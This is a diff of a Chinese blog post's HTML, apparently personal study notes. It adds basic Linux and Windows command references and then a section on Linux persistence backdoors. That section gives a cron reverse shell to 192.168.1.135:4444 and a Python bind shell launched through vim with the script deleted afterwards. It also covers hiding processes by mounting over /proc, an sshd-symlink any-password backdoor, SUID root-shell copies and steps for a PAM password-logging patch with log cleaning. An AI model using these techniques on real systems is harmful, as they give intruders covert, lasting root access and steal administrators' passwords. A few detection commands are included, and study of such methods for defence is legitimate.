@@ -1,16 +1,16 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>十 | 欢迎来到我的博客</title><meta name="author" content="仰泳鱼"><meta name="copyright" content="仰泳鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="操作系统指令记忆Linux [!note]#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载linux发行版本：Debian–&gt;kali linuxubuntucentos5678–&gt;cent stream国产：麒麟，统信，mac，arch，鸿蒙组成：内核和系统调用基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理主要特征：并发 共享 虚拟 随机 异步">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>十 | 欢迎来到我的博客</title><meta name="author" content="仰泳鱼"><meta name="copyright" content="仰泳鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="操作系统基本命令Linux [!note]#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载linux发行版本：Debian–&gt;kali linuxubuntucentos5678–&gt;cent stream国产：麒麟，统信，mac，arch，鸿蒙组成：内核和系统调用基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理主要特征：并发 共享 虚拟 随机 异步Linu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="十">
 <meta property="og:url" content="http://example.com/2024/07/19/2024-07-19/index.html">
 <meta property="og:site_name" content="欢迎来到我的博客">
-<meta property="og:description" content="操作系统指令记忆Linux [!note]#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载linux发行版本：Debian–&gt;kali linuxubuntucentos5678–&gt;cent stream国产：麒麟，统信，mac，arch，鸿蒙组成：内核和系统调用基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理主要特征：并发 共享 虚拟 随机 异步">
+<meta property="og:description" content="操作系统基本命令Linux [!note]#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载linux发行版本：Debian–&gt;kali linuxubuntucentos5678–&gt;cent stream国产：麒麟，统信，mac，arch，鸿蒙组成：内核和系统调用基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理主要特征：并发 共享 虚拟 随机 异步Linu">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp">
+<meta property="og:image" content="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp">
 <meta property="article:published_time" content="2024-07-18T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-12-24T09:04:00.212Z">
+<meta property="article:modified_time" content="2025-10-13T07:30:31.077Z">
 <meta property="article:author" content="仰泳鱼">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp"><link rel="shortcut icon" href="https://www.emojiall.com/images/240/emojione/1f1e8-1f1f3.png"><link rel="canonical" href="http://example.com/2024/07/19/2024-07-19/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp"><link rel="shortcut icon" href="https://www.emojiall.com/images/240/emojione/1f1e8-1f1f3.png"><link rel="canonical" href="http://example.com/2024/07/19/2024-07-19/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
   localSearch: undefined,
@@ -55,7 +55,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-12-24 17:04:00'
+  postUpdate: '2025-10-13 15:30:31'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -173,23 +173,135 @@
     document.addEventListener('pjax:send', () => { preloader.initLoading() })
     document.addEventListener('pjax:complete', () => { preloader.endLoading() })
   }
-})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="欢迎来到我的博客"><span class="site-name">欢迎来到我的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">十</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-18T16:00:00.000Z" title="发表于 2024-07-19 00:00:00">2024-07-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-24T09:04:00.212Z" title="更新于 2024-12-24 17:04:00">2024-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A5%E5%BF%97/">日志</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="十"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="操作系统指令记忆"><a href="#操作系统指令记忆" class="headerlink" title="操作系统指令记忆"></a>操作系统指令记忆</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><blockquote>
-<p>[!note]<br>#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载<br>linux发行版本：<br>Debian–&gt;kali linux<br>ubuntu<br>centos5678–&gt;cent stream<br>国产：麒麟，统信，mac，arch，鸿蒙<br>组成：内核和系统调用<br>基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理<br>主要特征：并发 共享 虚拟 随机 异步</p>
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="欢迎来到我的博客"><span class="site-name">欢迎来到我的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">十</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-18T16:00:00.000Z" title="发表于 2024-07-19 00:00:00">2024-07-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-13T07:30:31.077Z" title="更新于 2025-10-13 15:30:31">2025-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A5%E5%BF%97/">日志</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="十"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="操作系统基本命令"><a href="#操作系统基本命令" class="headerlink" title="操作系统基本命令"></a>操作系统基本命令</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><blockquote>
+<p>[!note]<br>#挂载在文件夹内才能生效 必须先分区，linux只有一个盘默认下载<br>linux发行版本：<br>Debian–&gt;kali linux<br>ubuntu<br>centos5678–&gt;cent stream<br>国产：麒麟，统信，mac，arch，鸿蒙<br>组成：内核和系统调用<br>基本功能：处理器管理 设备管理 文件管理 存储管理 作业管理<br>主要特征：并发 共享 虚拟 随机 异步<br>Linux用户权限划分：<br>root用户：UID为0，拥有系统的完全控制权限<br>系统用户：UID(0-999)<br>普通用户：UID(1000-*)<br>使用id命令可查看UID值。</p>
 </blockquote>
+<ul>
+<li><p>ls</p>
+</li>
+<li><p>ifconfig</p>
+</li>
+<li><p>pwd</p>
+</li>
+<li><p>pwdx 查看进程目录</p>
+</li>
+<li><p>cd</p>
+</li>
+<li><p>mkdir 创建目录</p>
+</li>
+<li><p>rmdir 删除空目录</p>
+</li>
+<li><p>rm</p>
+</li>
+<li><p>cp</p>
+</li>
+<li><p>mv</p>
+</li>
+<li><p>touch</p>
+</li>
+<li><p>cat</p>
+</li>
+<li><p>chdir 切换目录</p>
+</li>
+<li><p>grep 搜索指定文本</p>
+</li>
+<li><p>ps 显示进程 aux –sort&#x3D;-%cpu</p>
+</li>
+<li><p>top 按P用CPU排序 按M用内存占用率排序</p>
+</li>
+<li><p>kill</p>
+</li>
+<li><p>wget</p>
+</li>
+<li><p>chmod 下图</p>
+</li>
+<li><p>tar</p>
+</li>
+<li><p>awk</p>
+</li>
+<li><p>echo</p>
+</li>
+<li><p>curl</p>
+</li>
+<li><p>history 命令历史记录</p>
+</li>
+<li><p>sudo</p>
+</li>
+<li><p>crontab</p>
+</li>
+<li><p>find -类型 f -mtime -1 过去一天修改过的文件</p>
+</li>
+<li><p>systemctl 所有unit（系统资源、服务的基本单位）</p>
+</li>
+<li><p>xargs 一般跟在管道符后，相当于并且进行..</p>
+</li>
+<li><p>dpkg -l 显示安装全部应用</p>
+</li>
+<li><p>lsof  -p 进程 &#x2F; -i 端口 ：列出进程文件，端口连接</p>
+</li>
+<li><p>getent passwd （group admin&#x2F;ssh、passwd、用户名）显示用户信息</p>
+</li>
+<li><p>traceroute IP 跟踪数据包到达目标主机的路径 显示经过的每一个路由器的IP地址和响应时间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查看当前操作系统版本：</span><br><span class="line">hostnamectl</span><br><span class="line"></span><br><span class="line">cat /etc/*-release</span><br><span class="line"></span><br><span class="line">lsb_release -a</span><br><span class="line"></span><br><span class="line">cat /etc/lsb-release #Debain8</span><br><span class="line">cat /etc/redhat-release #Redhat10</span><br><span class="line">cat /etc/centos-release #Centos</span><br><span class="line">cat /etc/os-release #Ubuntu14</span><br><span class="line"></span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line">当前主机的内核版本</span><br><span class="line">hostnamectl</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line">dmesg | grep &quot;Linux version&quot;</span><br></pre></td></tr></table></figure>
+<p>chmod数字代表的是文件所有者（User）,用户组（Group）,其它用户（Other）的读、写、执行</p>
+</li>
+</ul>
 <table>
 <thead>
 <tr>
-<th>命令</th>
-<th>作用</th>
-<th></th>
-<th></th>
+<th>#</th>
+<th>权限</th>
+<th>rwx</th>
+<th>二进制</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>chdir</td>
-<td>切换目录</td>
-<td></td>
-<td></td>
+<td>7</td>
+<td>读 + 写 + 执行</td>
+<td>rwx</td>
+<td>111</td>
+</tr>
+<tr>
+<td>6</td>
+<td>读 + 写</td>
+<td>rw-</td>
+<td>110</td>
+</tr>
+<tr>
+<td>5</td>
+<td>读 + 执行</td>
+<td>r-x</td>
+<td>101</td>
+</tr>
+<tr>
+<td>4</td>
+<td>只读</td>
+<td>r–</td>
+<td>100</td>
+</tr>
+<tr>
+<td>3</td>
+<td>写 + 执行</td>
+<td>-wx</td>
+<td>011</td>
+</tr>
+<tr>
+<td>2</td>
+<td>只写</td>
+<td>-w-</td>
+<td>010</td>
+</tr>
+<tr>
+<td>1</td>
+<td>只执行</td>
+<td>–x</td>
+<td>001</td>
+</tr>
+<tr>
+<td>0</td>
+<td>无</td>
+<td>—</td>
+<td>000</td>
 </tr>
 </tbody></table>
 <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><table>
@@ -240,14 +352,78 @@
 <td>写入内容到文件中</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td>echo hello，world &gt;&gt; 1.txt</td>
+<td>向1.txt中追加 hello，word</td>
+</tr>
+<tr>
+<td>deltree 文件</td>
+<td>删除文件夹和它下面的所有子文件夹还有文件</td>
+</tr>
+<tr>
+<td>ren xxx xxx</td>
+<td>重新命名</td>
+</tr>
+<tr>
+<td>move 1.txt d:&#x2F;</td>
+<td>将文件移动到d盘</td>
+</tr>
+<tr>
+<td>1.txt edit</td>
+<td>打开1.txt文件</td>
+</tr>
+<tr>
+<td>set</td>
+<td>查看环境变量</td>
+</tr>
+<tr>
+<td>hostname</td>
+<td>主机名</td>
+</tr>
+<tr>
+<td>runas &#x2F;user:administrator cmd</td>
+<td>切换管理员</td>
+</tr>
+<tr>
+<td>CHCP 65001</td>
+<td>修改字体编码为UTF-8</td>
+</tr>
+<tr>
+<td>tracert</td>
+<td>发送数据包途径的路径</td>
 </tr>
 </tbody></table>
-<p>windows\System32\config\SAM 存放 windows 账号密码的文件（重要）加密过的系统帐号的密码文件，一般软件是打不开的。<br>windows\System32\drivers\etc\hosts 文件（重要）负责解析域名并优先于 DNS 服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目的。</p>
-<h1 id="Linux文件名解析"><a href="#Linux文件名解析" class="headerlink" title="Linux文件名解析"></a>Linux文件名解析</h1><blockquote>
-<p>[!note]<br>查看linux文件：ls -al<br>ls -lhi<br><img src="/../img/Pasted%20image%2020240719092920.png"><br>X XXX XXX XXX.文件访问次数 所有者 所有组 大小 最后一次修改时间 文件名<br>#Linux前缀的含义: d目录 -文件 l软链接<br>xr权限对应所属者，xr对应所属组 x对应其他人<br><img src="/../img/Pasted%20image%2020240719092623.png"><br>rwx对应root rwx对应root 用户也是rwx （每三个一一对应）<br><img src="/../img/Pasted%20image%2020240719093032.png"><br>linux里文件扩展名和文件类型没有关系，对内容无影响。但为了容易区分和兼容用户使用windows的习惯，我们还是会用扩展名来表示文件类型<br><img src="/../img/Pasted%20image%2020240719095355.png"></p>
+<p>windows\System32\config\SAM 存放 windows 账号密码的文件（重要）加密过的系统帐号的密码文件，一般软件是打不开的。<br>windows\System32\drivers\etc\hosts 文件（重要）负责解析域名并优先于 DNS 服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目的。<br>Windows\System32\winevt\Logs 存储 Windows 系统事件日志文件</p>
+<h1 id="Linux文件名含义"><a href="#Linux文件名含义" class="headerlink" title="Linux文件名含义"></a>Linux文件名含义</h1><blockquote>
+<p>[!note]<br>查看linux文件：ls -al<br>ls -lhi<br><img src="/../img/Pasted%20image%2020240719092920.png"><br>X XXX XXX XXX.文件访问次数 所有者 所有组 大小 最后一次修改时间 文件名<br>#Linux前缀的含义: 在 Linux 中第一个字符代表这个文件是目录、文件或链接文件等等(d目录 -文件 l软链接)<br>xr权限对应所属者，xr对应所属组 x对应其他人<br><img src="/../img/Pasted%20image%2020240719092623.png"><br>rwx对应root rwx对应root 用户1也是rwx （每三个一一对应）<br><img src="/../img/Pasted%20image%2020240719093032.png"><br>linux里文件扩展名和文件类型没有关系，对内容无影响。但为了容易区分和兼容用户使用windows的习惯，我们还是会用扩展名来表示文件类型<br><img src="/../img/Pasted%20image%2020240719095355.png"><br>解释一下&#x2F;etc&#x2F;passwd文件每个字段的含义？<br>用：分隔<br>分别是用户名:加密后的用户口令字:UID:GID:注释性描述:所处主目录、初始目录:登录的shell<br>$IFS–&gt;代表linux中的空格</p>
 </blockquote>
+<h1 id="Linux持久化后门"><a href="#Linux持久化后门" class="headerlink" title="Linux持久化后门"></a>Linux持久化后门</h1><p>进程注入 动态链接库<br>排查：文件排查，查看历史命令记录，特殊权限文件查找，进程排查，日志排查，入侵检测工具GScan</p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>crontab -l   &#x2F;&#x2F;列出任务<br>crontab -e   &#x2F;&#x2F;编辑任务<br>    <code>* * * * * /bin/bash -c &#39;/bin/sh -i &gt;&amp;/dev/tcp/192.168.1.135/4444 0&gt;&amp;1&#39;;\r%100c\n</code>计划任务反弹shell</p>
+<h2 id="Vim后门"><a href="#Vim后门" class="headerlink" title="Vim后门"></a>Vim后门</h2><p>Vim是从 vi 发展出来的一个文本编辑器，适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">	server.bind((&#x27;0.0.0.0&#x27;,xxxx))</span><br><span class="line">	server.listen(5)</span><br><span class="line">	print (&#x27;waiting for connect&#x27;)</span><br><span class="line">	talk, addr = server.accept()</span><br><span class="line">	print (&#x27;connect from&#x27;,addr)</span><br><span class="line">	proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">		stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
+<p><code>nohup python3 xxx.py &gt; /dev/null 2&gt;&amp;1 &amp;</code> 直接执行关防火墙<br>    1. <code>&gt; /dev/null 2&gt;&amp;1</code><br>    这个部分将标准输出和标准错误输出重定向到 <code>/dev/null</code>，即丢弃所有输出，这样不会在终端显示任何信息。<br>    2. <code>&amp;</code><br>    将整个命令放入后台执行。<br><code>nohup vim -E -c &quot;pyfile xxx.py&quot;&amp;</code>  <br>    <code>nohup</code>：使命令在用户注销后继续运行<br>    <code>vim -E</code>：使用 Vim 编辑器的“易用”模式（不加载插件）<br>    <code>-c &quot;pyfile xxx.py&quot;</code>：在启动 Vim 后运行 <code>pyfile</code> 命令来执行 Python 脚本 <code>xxx.py     </code><br>一句话：$(nohup vim -E -c “pyfile jaky.py”&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f xxx.py</p>
+<p>#隐藏进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir null</span><br><span class="line">mount --bind null /proc/5480</span><br><span class="line">netstat -anpt</span><br><span class="line"></span><br><span class="line">#mount --bind命令是将前一个目录挂载到后一个目录上，所有对后一个目录的访问其实都是对前一个目录的访问，并且会将前一个目录路径隐藏起来（注意这里只是隐藏不是删除，数据未发生改变，仅仅是无法访问了）。  </span><br><span class="line">umount /proc/5480进行解除挂载</span><br></pre></td></tr></table></figure>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>需要ssh配置允许PAM认证才能使用（防御：修改端口号，仅主机，禁止root）<br>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中（&#x2F;etc&#x2F;pam.d&#x2F;目录下）寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br><span class="line">建立软连接到/usr/local/su 文件 靶机</span><br><span class="line"></span><br><span class="line">ssh root@192.168.1.148 -p 12345</span><br><span class="line">利用ssh并使用任意密码登陆靶机</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld.service有防火墙关防火墙</span><br></pre></td></tr></table></figure>
+<p>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p>
+<p>公钥免密登录：容易被发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line">cat xxx/xxx/id_rsa.pub &gt; authorized_keys </span><br><span class="line">//将id_rsa.pub内容放到目标.ssh/authorized_keys里.还可能用在如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景</span><br><span class="line"></span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"># chmod 600 /root/.ssh/authorized_keys # chmod 700 /root/.ssh</span><br><span class="line">ssh -i xxx/xxx/id_rsa root@192.168.1.148</span><br></pre></td></tr></table></figure>
+<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>当s这个标志出现在文件所有者的x权限上时,此时就被称为Set UID.简程SUID.<br>当一个文件或者程序所属 suid为0时,那么它的归属及为root,当执行该文件时,其实是以root身份执行的。</p>
+<blockquote>
+<p>SUID权限仅对二进制程序有效。<br>执行者对于该程序需要具有x的可执行权限<br>本权限仅在执行该程序的过程中有效<br>在执行过程中执行者将具有该程序拥有者的权限</p>
+</blockquote>
+<p>创建SUID文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/.xxx</span><br><span class="line">chmod 4755 /tmp/.xxx</span><br><span class="line">ls -al /tmp/.xxx</span><br><span class="line">输出信息：-rwsr-xr-x 1 root root 690668 Jul 24 17:14 .xxx</span><br></pre></td></tr></table></figure>
+<p>使用文件获得root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmp/.woot</span><br><span class="line">/tmp/.woot -p //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shellhttps://blog.csdn.net/fatshaw/article/details/6171035</span><br></pre></td></tr></table></figure>
+<p>检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +4000 -ls</span><br><span class="line"></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>PAM（Pluggable Authentication Modules，可插入的身份验证模块）Linux中的一种安全验证方式是基于<code>模块化设计、具有可插入功能的一种独立于应用程序之外</code>的验证方式<a target="_blank" rel="noopener" href="https://cloud.tencent.com.cn/developer/article/2129693">Linux之PAM系统模块详解说明-腾讯云开发者社区-腾讯云</a><br>PAM使用配置 &#x2F;etc&#x2F;pam.d&#x2F; 下的文件来管理认证方式，应用程序调用相应的配置文件<br>加载动态库的形式调用 &#x2F;lib&#x2F;security（模块路径）下的模块<br>    -:ALL EXCEPT wheel: ALL<br>    该文件的每一行由如下三个字段构成，中间使用冒号分割：<br>    权限:用户:来源<br>    权限(permission) 这一位可以是+&#x2F;-。其中+表示允许访问，-表示禁止访问；<br>    EXCEPT操作符来表示除了…之外；所以上面这句表示只能wheel组才能ssh进入系统。<br>文件名格式一般为pam_xxx.so(取决于操作系统位数）<br>PAM配置可分为四个参数: 模块&#x2F;工作类型、控制标记&#x2F;模式、模块路径、模块参数<br>例如: session |required |pam_se linux.so| open env_params<br>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。<br>利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt; 将生成的pam_uninx.so文件覆盖到&#x2F;lib&#x2F;secruity&#x2F;pam_unix.so下 &gt;&gt;&gt; 修改文件属性 &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志</p>
